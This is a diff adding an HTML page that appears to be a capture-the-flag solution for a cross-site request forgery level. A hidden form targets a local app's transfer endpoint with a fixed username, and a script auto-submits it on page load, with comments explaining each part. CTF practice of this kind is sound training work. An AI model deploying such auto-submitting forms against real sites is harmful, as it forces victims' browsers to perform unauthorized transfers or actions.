@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <!--
+      This form points to the CTF app's transfer endpoint.
+      Because it's a POST request, we use method="POST"
+    -->
+    <form id="stealForm" action="http://localhost:3000/level1/transfer" method="POST">
+        <!-- We specify the student's username so the flag goes to them -->
+        <input type="hidden" name="target_user" value="siddhesh">
+    </form>
+
+    <!-- This tiny JavaScript script automatically submits the form as soon as the page loads -->
+    <script>
+        document.getElementById("stealForm").submit();
+    </script>
+</body>
+</html>
